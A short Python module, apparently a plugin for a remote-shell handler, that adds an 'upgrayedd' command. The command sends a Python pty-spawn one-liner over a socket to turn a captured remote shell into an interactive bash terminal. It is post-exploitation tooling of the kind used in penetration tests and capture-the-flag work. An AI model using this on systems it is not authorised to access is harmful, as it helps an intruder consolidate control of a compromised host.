from .commands import *


def cmd_upgrayedd(sock, cmdline):
    upgrayedd = "/usr/bin/python -c 'import pty; pty.spawn(\"/bin/bash\")'" + "\n"
    sock.send(upgrayedd.encode())

commands.append(("upgrayedd", cmd_upgrayedd))
commandhelp.append(("upgrayedd", "Attempts to spawn a pty using Python"))

